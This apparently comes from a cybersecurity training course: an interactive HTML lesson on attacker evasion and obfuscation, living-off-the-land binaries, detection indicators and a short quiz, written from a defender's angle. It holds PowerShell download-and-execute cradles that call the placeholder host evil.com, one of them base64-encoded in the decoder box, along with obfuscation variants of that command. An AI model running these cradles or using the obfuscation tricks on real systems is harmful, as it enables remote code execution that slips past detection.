@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Evasion & Obfuscation | CyberOps Week 2</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 50%, #0f172a 100%);
+            min-height: 100vh;
+            color: #e2e8f0;
+            line-height: 1.6;
+        }
+
+        .top-nav {
+            background: rgba(15, 23, 42, 0.95);
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(6, 182, 212, 0.3);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .breadcrumb { display: flex; align-items: center; gap: 0.5rem; font-size: 0.9rem; }
+        .breadcrumb a { color: #06b6d4; text-decoration: none; }
+        .breadcrumb .separator { color: #64748b; }
+        .breadcrumb .current { color: #8b5cf6; }
+
+        .nav-progress { display: flex; align-items: center; gap: 1rem; }
+        .progress-bar { width: 200px; height: 8px; background: rgba(100, 116, 139, 0.3); border-radius: 4px; overflow: hidden; }
+        .progress-fill { height: 100%; background: linear-gradient(90deg, #06b6d4, #8b5cf6); transition: width 0.5s; }
+        .progress-text { font-size: 0.85rem; color: #94a3b8; }
+
+        .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
+
+        .section-nav { display: flex; gap: 0.5rem; margin-bottom: 2rem; flex-wrap: wrap; }
+        .section-btn { padding: 0.75rem 1.5rem; background: rgba(30, 41, 59, 0.8); border: 1px solid rgba(100, 116, 139, 0.3); border-radius: 8px; color: #94a3b8; cursor: pointer; transition: all 0.3s; }
+        .section-btn:hover { border-color: #06b6d4; color: #06b6d4; }
+        .section-btn.active { background: linear-gradient(135deg, rgba(6, 182, 212, 0.2), rgba(139, 92, 246, 0.2)); border-color: #8b5cf6; color: #fff; }
+        .section-btn.completed { border-color: #10b981; color: #10b981; }
+        .section-btn.completed::after { content: ' ✓'; }
+
+        .section { display: none; animation: fadeIn 0.5s ease; }
+        .section.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .section-header { text-align: center; margin-bottom: 2rem; }
+        .section-header h1 { font-size: 2rem; background: linear-gradient(135deg, #06b6d4, #8b5cf6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 0.5rem; }
+        .section-header p { color: #94a3b8; font-size: 1.1rem; }
+
+        .card { background: rgba(30, 41, 59, 0.6); border: 1px solid rgba(100, 116, 139, 0.2); border-radius: 12px; padding: 1.5rem; margin-bottom: 1.5rem; }
+        .card h3 { color: #06b6d4; margin-bottom: 1rem; }
+
+        /* Technique Cards */
+        .technique-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 1.5rem;
+            margin: 1.5rem 0;
+        }
+
+        .technique-card {
+            background: rgba(30, 41, 59, 0.8);
+            border: 2px solid rgba(239, 68, 68, 0.3);
+            border-radius: 12px;
+            padding: 1.5rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            position: relative;
+        }
+
+        .technique-card:hover {
+            border-color: #ef4444;
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(239, 68, 68, 0.2);
+        }
+
+        .technique-card.explored { border-color: #10b981; }
+
+        .technique-card .icon { font-size: 2.5rem; margin-bottom: 1rem; }
+        .technique-card h4 { color: #f1f5f9; margin-bottom: 0.5rem; }
+        .technique-card p { color: #94a3b8; font-size: 0.9rem; }
+
+        .technique-card .mitre-tag {
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            background: rgba(139, 92, 246, 0.2);
+            padding: 0.25rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            color: #a78bfa;
+        }
+
+        /* Code Examples */
+        .code-block {
+            background: #0a0a0a;
+            border: 1px solid rgba(6, 182, 212, 0.3);
+            border-radius: 8px;
+            padding: 1rem;
+            font-family: 'Consolas', monospace;
+            font-size: 0.85rem;
+            overflow-x: auto;
+            margin: 1rem 0;
+        }
+
+        .code-block .comment { color: #6b7280; }
+        .code-block .keyword { color: #f472b6; }
+        .code-block .string { color: #34d399; }
+        .code-block .function { color: #60a5fa; }
+
+        /* Interactive Decoder */
+        .decoder-container {
+            background: rgba(30, 41, 59, 0.8);
+            border: 2px solid rgba(139, 92, 246, 0.3);
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+
+        .decoder-input {
+            width: 100%;
+            padding: 1rem;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(100, 116, 139, 0.3);
+            border-radius: 8px;
+            color: #e2e8f0;
+            font-family: monospace;
+            margin-bottom: 1rem;
+        }
+
+        .decoder-input:focus { outline: none; border-color: #06b6d4; }
+
+        .decode-btns {
+            display: flex;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+            margin-bottom: 1rem;
+        }
+
+        .decode-btn {
+            padding: 0.5rem 1rem;
+            background: rgba(30, 41, 59, 0.8);
+            border: 1px solid rgba(100, 116, 139, 0.3);
+            border-radius: 6px;
+            color: #e2e8f0;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .decode-btn:hover { border-color: #06b6d4; }
+        .decode-btn.active { background: rgba(6, 182, 212, 0.2); border-color: #06b6d4; }
+
+        .decoder-output {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            border-radius: 8px;
+            padding: 1rem;
+            font-family: monospace;
+            min-height: 60px;
+        }
+
+        /* Living Off the Land */
+        .lotl-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+
+        .lotl-card {
+            background: rgba(30, 41, 59, 0.8);
+            border: 1px solid rgba(100, 116, 139, 0.3);
+            border-radius: 8px;
+            padding: 1rem;
+            text-align: center;
+        }
+
+        .lotl-card .binary { font-family: monospace; color: #06b6d4; font-weight: bold; }
+        .lotl-card .use { font-size: 0.85rem; color: #94a3b8; margin-top: 0.5rem; }
+
+        /* Quiz */
+        .quiz-container { background: rgba(30, 41, 59, 0.8); border-radius: 12px; padding: 2rem; }
+        .quiz-question { margin-bottom: 2rem; padding-bottom: 2rem; border-bottom: 1px solid rgba(100, 116, 139, 0.2); }
+        .quiz-question h4 { color: #f1f5f9; margin-bottom: 1rem; }
+        .quiz-options { display: flex; flex-direction: column; gap: 0.75rem; }
+        .quiz-option { padding: 1rem; background: rgba(30, 41, 59, 0.6); border: 2px solid rgba(100, 116, 139, 0.3); border-radius: 8px; cursor: pointer; }
+        .quiz-option:hover { border-color: #06b6d4; }
+        .quiz-option.selected { border-color: #8b5cf6; background: rgba(139, 92, 246, 0.1); }
+
+        .submit-btn { padding: 1rem 2rem; background: linear-gradient(135deg, #06b6d4, #8b5cf6); border: none; border-radius: 8px; color: #fff; font-weight: 600; cursor: pointer; margin-top: 1rem; }
+
+        .quiz-results { text-align: center; padding: 2rem; display: none; }
+        .quiz-results.show { display: block; }
+        .score-display { font-size: 3rem; font-weight: bold; background: linear-gradient(135deg, #06b6d4, #8b5cf6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+
+        .nav-buttons { display: flex; justify-content: space-between; margin-top: 2rem; padding-top: 2rem; border-top: 1px solid rgba(100, 116, 139, 0.2); }
+        .nav-btn { padding: 0.75rem 1.5rem; background: rgba(30, 41, 59, 0.8); border: 1px solid rgba(100, 116, 139, 0.3); border-radius: 8px; color: #e2e8f0; cursor: pointer; }
+        .nav-btn:hover { border-color: #06b6d4; }
+        .nav-btn.primary { background: linear-gradient(135deg, #06b6d4, #8b5cf6); border: none; }
+
+        /* Detection Table */
+        .detection-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+        }
+
+        .detection-table th, .detection-table td {
+            padding: 1rem;
+            text-align: left;
+            border-bottom: 1px solid rgba(100, 116, 139, 0.2);
+        }
+
+        .detection-table th { background: rgba(6, 182, 212, 0.1); color: #06b6d4; }
+    </style>
+</head>
+<body>
+    <nav class="top-nav">
+        <div class="breadcrumb">
+            <a href="/houses/eye/">Eye House</a>
+            <span class="separator">›</span>
+            <a href="../../modules/cyberops/index.html">CyberOps</a>
+            <span class="separator">›</span>
+            <a href="week2/index.html">Week 2</a>
+            <span class="separator">›</span>
+            <span class="current">Evasion & Obfuscation</span>
+        </div>
+        <div class="nav-progress">
+            <div class="progress-bar"><div class="progress-fill" id="progressFill" style="width: 0%"></div></div>
+            <span class="progress-text" id="progressText">0% Complete</span>
+        </div>
+    </nav>
+
+    <div class="container">
+        <div class="section-nav">
+            <button class="section-btn active" data-section="overview">1. Evasion Techniques</button>
+            <button class="section-btn" data-section="obfuscation">2. Obfuscation</button>
+            <button class="section-btn" data-section="lotl">3. Living Off the Land</button>
+            <button class="section-btn" data-section="quiz">4. Assessment</button>
+        </div>
+
+        <!-- Section 1: Overview -->
+        <div class="section active" id="overview">
+            <div class="section-header">
+                <h1>Evasion & Obfuscation</h1>
+                <p>How attackers hide from security controls and detection</p>
+            </div>
+
+            <div class="card">
+                <h3>🎭 Why Attackers Evade</h3>
+                <p>Modern security defenses are layered: firewalls, IDS/IPS, EDR, SIEM. Attackers must bypass multiple detection mechanisms to succeed. Understanding evasion helps defenders:</p>
+                <ul style="margin: 1rem 0 0 1.5rem; color: #94a3b8;">
+                    <li>Recognize signs of evasion attempts</li>
+                    <li>Tune detection rules for encoded/obfuscated content</li>
+                    <li>Hunt for techniques that bypass automated detection</li>
+                    <li>Understand attacker tradecraft for better defense</li>
+                </ul>
+            </div>
+
+            <div class="card">
+                <h3>🔧 Common Evasion Categories</h3>
+                <p>Click each technique to learn more.</p>
+
+                <div class="technique-grid">
+                    <div class="technique-card" data-technique="encryption">
+                        <span class="mitre-tag">T1573</span>
+                        <div class="icon">🔐</div>
+                        <h4>Encrypted Channels</h4>
+                        <p>Using TLS/SSL to hide C2 communication from inspection</p>
+                    </div>
+                    <div class="technique-card" data-technique="tunneling">
+                        <span class="mitre-tag">T1572</span>
+                        <div class="icon">🚇</div>
+                        <h4>Protocol Tunneling</h4>
+                        <p>Hiding malicious traffic inside legitimate protocols (DNS, HTTPS, ICMP)</p>
+                    </div>
+                    <div class="technique-card" data-technique="encoding">
+                        <span class="mitre-tag">T1132</span>
+                        <div class="icon">🔢</div>
+                        <h4>Data Encoding</h4>
+                        <p>Base64, XOR, custom encoding to bypass pattern matching</p>
+                    </div>
+                    <div class="technique-card" data-technique="fragmentation">
+                        <span class="mitre-tag">T1027</span>
+                        <div class="icon">🧩</div>
+                        <h4>Fragmentation</h4>
+                        <p>Splitting payloads across packets or time to evade inspection</p>
+                    </div>
+                    <div class="technique-card" data-technique="steganography">
+                        <span class="mitre-tag">T1001.002</span>
+                        <div class="icon">🖼️</div>
+                        <h4>Steganography</h4>
+                        <p>Hiding data in images, audio, or other innocent-looking files</p>
+                    </div>
+                    <div class="technique-card" data-technique="polymorphism">
+                        <span class="mitre-tag">T1027.001</span>
+                        <div class="icon">🦎</div>
+                        <h4>Polymorphism</h4>
+                        <p>Changing malware code each execution to evade signatures</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="nav-buttons">
+                <div></div>
+                <button class="nav-btn primary" onclick="goToSection('obfuscation')">Continue →</button>
+            </div>
+        </div>
+
+        <!-- Section 2: Obfuscation -->
+        <div class="section" id="obfuscation">
+            <div class="section-header">
+                <h1>Obfuscation Techniques</h1>
+                <p>Making malicious code harder to analyze and detect</p>
+            </div>
+
+            <div class="card">
+                <h3>🔢 Interactive Decoder</h3>
+                <p>Try decoding these common obfuscation methods:</p>
+
+                <div class="decoder-container">
+                    <input type="text" class="decoder-input" id="decoderInput" value="cG93ZXJzaGVsbCAtZSBJRVgobmV3LW9iamVjdCBuZXQud2ViY2xpZW50KS5kb3dubG9hZHN0cmluZygnaHR0cDovL2V2aWwuY29tL3NoZWxsJyk=" placeholder="Enter encoded text...">
+
+                    <div class="decode-btns">
+                        <button class="decode-btn" onclick="decode('base64')">Base64 Decode</button>
+                        <button class="decode-btn" onclick="decode('url')">URL Decode</button>
+                        <button class="decode-btn" onclick="decode('hex')">Hex Decode</button>
+                        <button class="decode-btn" onclick="decode('reverse')">Reverse String</button>
+                    </div>
+
+                    <div class="decoder-output" id="decoderOutput">
+                        Click a decode button to see the result...
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>💻 PowerShell Obfuscation Examples</h3>
+                <p>Attackers use various techniques to hide malicious PowerShell:</p>
+
+                <div class="code-block">
+                    <span class="comment"># Original command:</span><br>
+                    <span class="function">Invoke-Expression</span> (<span class="function">New-Object</span> Net.WebClient).DownloadString(<span class="string">'http://evil.com/payload'</span>)<br><br>
+
+                    <span class="comment"># Obfuscated versions:</span><br>
+                    <span class="keyword">powershell</span> -e <span class="string">SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AC...</span><br>
+                    <span class="keyword">powershell</span> -enc <span class="string">[base64 encoded command]</span><br>
+                    <span class="keyword">iex</span>($env:comspec[4,15,25]-join'')<br>
+                    <span class="keyword">&</span>((gv '*mdr*').Name[3,11,2]-join'')
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>🔍 Detection Indicators</h3>
+                <table class="detection-table">
+                    <tr>
+                        <th>Indicator</th>
+                        <th>What It Suggests</th>
+                    </tr>
+                    <tr>
+                        <td><code>-e</code> or <code>-enc</code> flag</td>
+                        <td>Base64 encoded PowerShell command</td>
+                    </tr>
+                    <tr>
+                        <td><code>FromBase64String</code></td>
+                        <td>Runtime decoding of encoded content</td>
+                    </tr>
+                    <tr>
+                        <td>Unusual variable names</td>
+                        <td>Auto-generated obfuscated code</td>
+                    </tr>
+                    <tr>
+                        <td>String concatenation</td>
+                        <td>Hiding keywords from detection</td>
+                    </tr>
+                    <tr>
+                        <td>Tick marks in commands</td>
+                        <td>Breaking up detectable strings</td>
+                    </tr>
+                </table>
+            </div>
+
+            <div class="nav-buttons">
+                <button class="nav-btn" onclick="goToSection('overview')">← Back</button>
+                <button class="nav-btn primary" onclick="goToSection('lotl')">Continue →</button>
+            </div>
+        </div>
+
+        <!-- Section 3: Living Off the Land -->
+        <div class="section" id="lotl">
+            <div class="section-header">
+                <h1>Living Off the Land</h1>
+                <p>Using legitimate system tools for malicious purposes</p>
+            </div>
+
+            <div class="card">
+                <h3>🏠 What is LOTL?</h3>
+                <p>"Living Off the Land" (LOTL) refers to attackers using built-in operating system tools rather than custom malware. This makes detection difficult because:</p>
+                <ul style="margin: 1rem 0 0 1.5rem; color: #94a3b8;">
+                    <li>Tools are signed by Microsoft/Apple — trusted by default</li>
+                    <li>Already present on systems — no need to drop files</li>
+                    <li>Legitimate admin use — hard to distinguish malicious use</li>
+                    <li>No custom indicators — traditional AV cannot detect</li>
+                </ul>
+            </div>
+
+            <div class="card">
+                <h3>🔧 Common LOLBins (Windows)</h3>
+                <div class="lotl-grid">
+                    <div class="lotl-card">
+                        <div class="binary">certutil.exe</div>
+                        <div class="use">Download files, decode Base64</div>
+                    </div>
+                    <div class="lotl-card">
+                        <div class="binary">mshta.exe</div>
+                        <div class="use">Execute HTA files/scripts</div>
+                    </div>
+                    <div class="lotl-card">
+                        <div class="binary">regsvr32.exe</div>
+                        <div class="use">Execute DLLs, bypass AppLocker</div>
+                    </div>
+                    <div class="lotl-card">
+                        <div class="binary">rundll32.exe</div>
+                        <div class="use">Execute arbitrary DLLs</div>
+                    </div>
+                    <div class="lotl-card">
+                        <div class="binary">wmic.exe</div>
+                        <div class="use">Execute commands, process creation</div>
+                    </div>
+                    <div class="lotl-card">
+                        <div class="binary">powershell.exe</div>
+                        <div class="use">Script execution, download cradles</div>
+                    </div>
+                    <div class="lotl-card">
+                        <div class="binary">bitsadmin.exe</div>
+                        <div class="use">Download files in background</div>
+                    </div>
+                    <div class="lotl-card">
+                        <div class="binary">msiexec.exe</div>
+                        <div class="use">Execute malicious MSI packages</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>🛡️ Detection Strategies</h3>
+                <table class="detection-table">
+                    <tr>
+                        <th>Strategy</th>
+                        <th>Implementation</th>
+                    </tr>
+                    <tr>
+                        <td>Command-line logging</td>
+                        <td>Enable PowerShell ScriptBlock logging, Sysmon</td>
+                    </tr>
+                    <tr>
+                        <td>Behavioral analytics</td>
+                        <td>Monitor for unusual parent-child process relationships</td>
+                    </tr>
+                    <tr>
+                        <td>Network correlation</td>
+                        <td>Flag certutil/bitsadmin making external connections</td>
+                    </tr>
+                    <tr>
+                        <td>Baseline comparison</td>
+                        <td>Alert on first-time use of LOLBins by users</td>
+                    </tr>
+                </table>
+            </div>
+
+            <div class="nav-buttons">
+                <button class="nav-btn" onclick="goToSection('obfuscation')">← Back</button>
+                <button class="nav-btn primary" onclick="goToSection('quiz')">Continue to Assessment →</button>
+            </div>
+        </div>
+
+        <!-- Section 4: Quiz -->
+        <div class="section" id="quiz">
+            <div class="section-header">
+                <h1>Knowledge Assessment</h1>
+                <p>Test your understanding of evasion and obfuscation</p>
+            </div>
+
+            <div class="quiz-container" id="quizContainer"></div>
+            <div class="quiz-results" id="quizResults">
+                <h2>Assessment Complete!</h2>
+                <div class="score-display" id="scoreDisplay">0%</div>
+                <p id="scoreMessage"></p>
+                <button class="submit-btn" onclick="retakeQuiz()">Retake Quiz</button>
+            </div>
+
+            <div class="nav-buttons">
+                <button class="nav-btn" onclick="goToSection('lotl')">← Back</button>
+                <button class="nav-btn primary" id="finishBtn" style="display: none;" onclick="completeModule()">Complete Module →</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const state = {
+            currentSection: 'overview',
+            sectionsCompleted: { overview: false, obfuscation: false, lotl: false, quiz: false },
+            quizAnswers: {}
+        };
+
+        const quizQuestions = [
+            { id: 1, question: "What is the primary goal of evasion techniques?", options: ["Increase malware file size", "Bypass security detection mechanisms", "Make malware run faster", "Reduce network bandwidth"], correct: 1 },
+            { id: 2, question: "The PowerShell flag '-enc' or '-e' typically indicates:", options: ["Encryption mode", "Base64 encoded command", "Error handling", "Enhanced logging"], correct: 1 },
+            { id: 3, question: "What does 'Living Off the Land' mean in security context?", options: ["Using solar-powered servers", "Using built-in OS tools for attacks", "Running malware from USB drives", "Using cloud infrastructure"], correct: 1 },
+            { id: 4, question: "Which Windows utility is commonly abused to download files?", options: ["notepad.exe", "calc.exe", "certutil.exe", "explorer.exe"], correct: 2 },
+            { id: 5, question: "Why are LOLBins difficult to detect?", options: ["They are encrypted", "They are signed and trusted by default", "They run in kernel mode", "They use custom protocols"], correct: 1 }
+        ];
+
+        document.addEventListener('DOMContentLoaded', () => {
+            loadProgress();
+            setupQuiz();
+            setupTechniques();
+            updateProgress();
+        });
+
+        function setupTechniques() {
+            document.querySelectorAll('.technique-card').forEach(card => {
+                card.addEventListener('click', () => {
+                    card.classList.add('explored');
+                });
+            });
+        }
+
+        function decode(method) {
+            const input = document.getElementById('decoderInput').value;
+            const output = document.getElementById('decoderOutput');
+
+            try {
+                let result;
+                switch(method) {
+                    case 'base64':
+                        result = atob(input);
+                        break;
+                    case 'url':
+                        result = decodeURIComponent(input);
+                        break;
+                    case 'hex':
+                        result = input.match(/.{1,2}/g)?.map(byte => String.fromCharCode(parseInt(byte, 16))).join('') || 'Invalid hex';
+                        break;
+                    case 'reverse':
+                        result = input.split('').reverse().join('');
+                        break;
+                    default:
+                        result = 'Unknown method';
+                }
+                output.textContent = result;
+                output.style.borderColor = 'rgba(16, 185, 129, 0.5)';
+            } catch(e) {
+                output.textContent = 'Decoding failed: ' + e.message;
+                output.style.borderColor = 'rgba(239, 68, 68, 0.5)';
+            }
+        }
+
+        function setupQuiz() {
+            const container = document.getElementById('quizContainer');
+            container.innerHTML = quizQuestions.map((q, idx) => `
+                <div class="quiz-question">
+                    <h4>${idx + 1}. ${q.question}</h4>
+                    <div class="quiz-options">
+                        ${q.options.map((opt, optIdx) => `
+                            <div class="quiz-option" data-question="${q.id}" data-option="${optIdx}">${opt}</div>
+                        `).join('')}
+                    </div>
+                </div>
+            `).join('') + '<button class="submit-btn" onclick="submitQuiz()">Submit Answers</button>';
+
+            container.querySelectorAll('.quiz-option').forEach(opt => {
+                opt.addEventListener('click', () => {
+                    const qId = opt.dataset.question;
+                    document.querySelectorAll(`[data-question="${qId}"]`).forEach(o => o.classList.remove('selected'));
+                    opt.classList.add('selected');
+                    state.quizAnswers[qId] = parseInt(opt.dataset.option);
+                });
+            });
+        }
+
+        document.querySelectorAll('.section-btn').forEach(btn => {
+            btn.addEventListener('click', () => goToSection(btn.dataset.section));
+        });
+
+        function goToSection(sectionId) {
+            if (['overview', 'obfuscation', 'lotl'].includes(state.currentSection)) {
+                state.sectionsCompleted[state.currentSection] = true;
+                document.querySelector(`[data-section="${state.currentSection}"]`).classList.add('completed');
+            }
+            state.currentSection = sectionId;
+            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+            document.querySelectorAll('.section-btn').forEach(b => b.classList.remove('active'));
+            document.getElementById(sectionId).classList.add('active');
+            document.querySelector(`[data-section="${sectionId}"]`).classList.add('active');
+            updateProgress();
+            saveProgress();
+        }
+
+        function submitQuiz() {
+            if (Object.keys(state.quizAnswers).length < quizQuestions.length) {
+                alert('Please answer all questions.');
+                return;
+            }
+
+            let correct = 0;
+            quizQuestions.forEach(q => { if (state.quizAnswers[q.id] === q.correct) correct++; });
+
+            const percentage = Math.round((correct / quizQuestions.length) * 100);
+            document.getElementById('quizContainer').style.display = 'none';
+            document.getElementById('quizResults').classList.add('show');
+            document.getElementById('scoreDisplay').textContent = `${percentage}%`;
+            document.getElementById('scoreMessage').textContent = percentage >= 80
+                ? `Excellent! You passed with ${correct}/${quizQuestions.length} correct!`
+                : `You scored ${correct}/${quizQuestions.length}. 80% required to pass.`;
+
+            if (percentage >= 80) {
+                state.sectionsCompleted.quiz = true;
+                document.querySelector('[data-section="quiz"]').classList.add('completed');
+                document.getElementById('finishBtn').style.display = 'block';
+            }
+            updateProgress();
+            saveProgress();
+        }
+
+        function retakeQuiz() {
+            state.quizAnswers = {};
+            document.getElementById('quizContainer').style.display = 'block';
+            document.getElementById('quizResults').classList.remove('show');
+            document.querySelectorAll('.quiz-option').forEach(o => o.classList.remove('selected'));
+        }
+
+        function completeModule() { window.location.href = 'week2/index.html'; }
+
+        function updateProgress() {
+            const completed = Object.values(state.sectionsCompleted).filter(v => v).length;
+            const percentage = Math.round((completed / 4) * 100);
+            document.getElementById('progressFill').style.width = `${percentage}%`;
+            document.getElementById('progressText').textContent = `${percentage}% Complete`;
+        }
+
+        function saveProgress() { localStorage.setItem('cyberops_evasion', JSON.stringify(state)); }
+        function loadProgress() {
+            const saved = localStorage.getItem('cyberops_evasion');
+            if (saved) {
+                Object.assign(state, JSON.parse(saved));
+                Object.entries(state.sectionsCompleted).forEach(([s, c]) => {
+                    if (c) document.querySelector(`[data-section="${s}"]`).classList.add('completed');
+                });
+            }
+        }
+    </script>
+</body>
+</html>
